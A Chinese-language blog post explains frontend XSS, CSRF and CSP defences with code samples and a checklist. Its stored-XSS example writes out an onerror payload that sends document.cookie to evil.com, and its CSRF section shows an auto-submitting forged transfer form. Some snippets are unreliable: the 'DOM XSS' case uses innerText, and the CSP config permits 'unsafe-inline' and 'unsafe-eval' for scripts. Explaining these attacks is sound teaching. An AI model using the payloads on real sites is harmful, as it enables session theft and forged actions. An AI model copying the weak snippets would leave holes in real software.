---
title: "前端安全防护：XSS、CSRF 与 CSP 的那些事儿"
tag: security
description: 全面解析前端安全三大威胁：XSS、CSRF 与 CSP，从攻击原理到防御实践，提供生产级的安全防护方案。
date: "2023-08-25T08:00:00.000Z"
---

## 目标

前端安全是一个容易被忽视但影响深远的领域。XSS 攻击可以窃取用户 Cookie、劫持会话；CSRF 可以冒充用户执行恶意操作；配置不当的 CSP 则形同虚设。本文从攻击原理出发，系统讲解三大安全威胁的防御方案，并提供可直接落地的代码实践。

## 背景

### 安全事件的真实代价

近年来因前端安全漏洞导致的事件屡见不鲜：

- **XSS 漏洞**：攻击者注入恶意脚本，窃取用户数据或劫持账户
- **CSRF 攻击**：用户在已登录状态下访问恶意网站，被冒充执行操作
- **数据泄露**：敏感信息通过 DOM 或 API 暴露给攻击者

前端安全不是「锦上添花」，而是「必须做对」的底线。

## XSS 攻击与防御

### 攻击类型

**1. 反射型 XSS**

```javascript
// 攻击者构造 URL
// https://example.com/search?q=<script>alert('xss')</script>

// 不安全的代码
function search(query) {
  document.getElementById('results').innerHTML = `搜索结果: ${query}`;
}
```

**2. 存储型 XSS**

```javascript
// 恶意内容存储在数据库中
// 评论区注入
const comment = '<img src="x" onerror="fetch(\'https://evil.com/steal?cookie=\'+document.cookie)">';

// 不安全的渲染
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

**3. DOM 型 XSS**

```javascript
// 从 URL 参数直接操作 DOM
const name = new URLSearchParams(window.location.search).get('name');
document.getElementById('greeting').innerText = `Hello, ${name}`;
// URL: ?name=<img src=x onerror=alert(1)>
```

### 防御方案

**1. 输入过滤**

```javascript
// 工具函数：HTML 实体转义
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  return str.replace(/[&<>"'/]/g, char => map[char]);
}

// 使用
const userInput = '<script>alert("xss")</script>';
const safe = escapeHtml(userInput);
// 输出: &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;
```

**2. React 中的安全实践**

```tsx
// ✅ 安全：React 默认转义
function SafeComponent({ content }) {
  return <div>{content}</div>;  // 自动转义 HTML
}

// ❌ 危险：使用 dangerouslySetInnerHTML
function UnsafeComponent({ content }) {
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// ✅ 安全：如果必须使用 dangerouslySetInnerHTML，先过滤
import DOMPurify from 'dompurify';

function SafeHtmlComponent({ content }) {
  const cleanHtml = DOMPurify.sanitize(content, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />;
}
```

**3. CSP（Content Security Policy）**

```javascript
// Next.js 配置
// next.config.js
module.exports = {
  headers: async () => [
    {
      source: '/(.*)',
      headers: [
        {
          key: 'Content-Security-Policy',
          value: [
            "default-src 'self'",
            "script-src 'self' 'unsafe-eval' 'unsafe-inline' https://cdn.example.com",
            "style-src 'self' 'unsafe-inline' https://fonts.googleapis.com",
            "img-src 'self' data: https:",
            "font-src 'self' https://fonts.gstatic.com",
            "connect-src 'self' https://api.example.com",
            "frame-ancestors 'none'",
            "base-uri 'self'",
            "form-action 'self'",
          ].join('; '),
        },
      ],
    },
  ],
};
```

## CSRF 攻击与防御

### 攻击原理

```html
<!-- 攻击者的恶意页面 -->
<body onload="document.getElementById('csrf-form').submit()">

<form id="csrf-form" action="https://bank.example.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker-account" />
  <input type="hidden" name="amount" value="10000" />
</form>

</body>
```

用户登录了银行网站后，访问攻击者的页面，浏览器会自动携带 Cookie 发起 POST 请求。

### 防御方案

**1. CSRF Token**

```typescript
// 服务端生成 CSRF Token
import crypto from 'crypto';

function generateCsrfToken(): string {
  return crypto.randomBytes(32).toString('hex');
}

// 中间件验证
function csrfMiddleware(req, res, next) {
  if (['POST', 'PUT', 'DELETE'].includes(req.method)) {
    const token = req.headers['x-csrf-token'];
    const sessionToken = req.session.csrfToken;

    if (!token || token !== sessionToken) {
      return res.status(403).json({ error: 'Invalid CSRF token' });
    }
  }
  next();
}
```

```tsx
// 前端携带 CSRF Token
async function submitForm(data) {
  const csrfToken = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');

  const response = await fetch('/api/submit', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': csrfToken,
    },
    body: JSON.stringify(data),
  });

  return response.json();
}
```

**2. SameSite Cookie**

```typescript
// 设置 SameSite Cookie
res.setHeader('Set-Cookie', [
  'session=abc123; SameSite=Strict; HttpOnly; Secure; Path=/',
  'token=xyz789; SameSite=Lax; HttpOnly; Secure; Path=/',
]);
```

- **Strict**：完全禁止跨站请求携带 Cookie（最严格，但可能影响正常跳转）
- **Lax**：GET 请求允许跨站携带（推荐大多数场景）
- **None**：允许跨站携带（必须配合 Secure 使用）

**3. 双重 Cookie 验证**

```typescript
// 服务端：在 HTML 中嵌入 CSRF Token
app.get('/', (req, res) => {
  const csrfToken = generateCsrfToken();
  req.session.csrfToken = csrfToken;
  res.render('index', { csrfToken });
});

// 前端：从 Cookie 中读取 Token 并在请求头中发送
async function apiRequest(url, options = {}) {
  const csrfToken = getCookie('csrf-token');

  return fetch(url, {
    ...options,
    headers: {
      ...options.headers,
      'X-CSRF-Token': csrfToken,
    },
  });
}
```

## 安全头部配置

### 完整的安全中间件

```typescript
// security.ts
import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

export function securityMiddleware(request: NextRequest) {
  const response = NextResponse.next();

  // X-Content-Type-Options: 防止 MIME 类型嗅探
  response.headers.set('X-Content-Type-Options', 'nosniff');

  // X-Frame-Options: 防止点击劫持
  response.headers.set('X-Frame-Options', 'DENY');

  // X-XSS-Protection: 浏览器 XSS 过滤（已废弃，但保留兼容）
  response.headers.set('X-XSS-Protection', '1; mode=block');

  // Referrer-Policy: 控制 Referer 头
  response.headers.set('Referrer-Policy', 'strict-origin-when-cross-origin');

  // Permissions-Policy: 禁用不需要的浏览器功能
  response.headers.set(
    'Permissions-Policy',
    'camera=(), microphone=(), geolocation=(self), payment=(self)'
  );

  // Strict-Transport-Security: 强制 HTTPS
  response.headers.set(
    'Strict-Transport-Security',
    'max-age=63072000; includeSubDomains; preload'
  );

  // Content-Security-Policy
  response.headers.set(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';"
  );

  return response;
}
```

## 敏感数据保护

### 不要在前端存储敏感信息

```typescript
// ❌ 错误：localStorage 存储敏感数据
localStorage.setItem('token', jwtToken);

// ✅ 正确：使用 HttpOnly Cookie（服务端设置）
// Set-Cookie: session=xxx; HttpOnly; Secure; SameSite=Strict; Path=/

// ❌ 错误：URL 参数传递敏感信息
// https://example.com/dashboard?token=xxx

// ✅ 正确：使用 POST 请求体或 Authorization 头
fetch('/api/data', {
  headers: {
    'Authorization': `Bearer ${token}`,
  },
});
```

### API 响应过滤

```typescript
// 服务端：过滤敏感字段
function sanitizeUser(user) {
  const { password, passwordHash, internalId, ...safeUser } = user;
  return safeUser;
}

app.get('/api/user/:id', (req, res) => {
  const user = db.users.findById(req.params.id);
  if (!user) return res.status(404).json({ error: 'Not found' });
  res.json(sanitizeUser(user));
});
```

## 安全检查清单

```markdown
## 前端安全 Checklist

### XSS 防护
- [ ] 用户输入经过 HTML 实体转义
- [ ] React 中避免使用 dangerouslySetInnerHTML
- [ ] 使用 DOMPurify 过滤富文本内容
- [ ] CSP 策略配置并启用
- [ ] 禁用 inline script（nonce 或 hash）

### CSRF 防护
- [ ] 状态修改操作使用 POST/PUT/DELETE
- [ ] CSRF Token 验证
- [ ] SameSite Cookie 配置
- [ ] 验证 Origin/Referer 头

### 数据保护
- [ ] 敏感数据不存储在 localStorage
- [ ] API 响应过滤敏感字段
- [ ] 传输层使用 HTTPS
- [ ] 密码等敏感信息不记录日志

### 安全头部
- [ ] X-Content-Type-Options: nosniff
- [ ] X-Frame-Options: DENY
- [ ] Strict-Transport-Security
- [ ] Referrer-Policy
- [ ] Permissions-Policy
```

## 总结

前端安全是一个系统工程，需要多层防御：

1. **输入验证**：所有用户输入都不可信，必须验证和过滤
2. **输出编码**：在渲染时根据上下文选择合适的编码方式
3. **CSP**：作为最后一道防线，限制脚本来源
4. **Cookie 安全**：SameSite + HttpOnly + Secure 三件套
5. **安全头部**：防御点击劫持、MIME 嗅探等常见攻击

安全不是一次性的工作，而是持续的过程。建议将安全检查纳入 CI/CD 流程，使用自动化工具扫描常见漏洞。
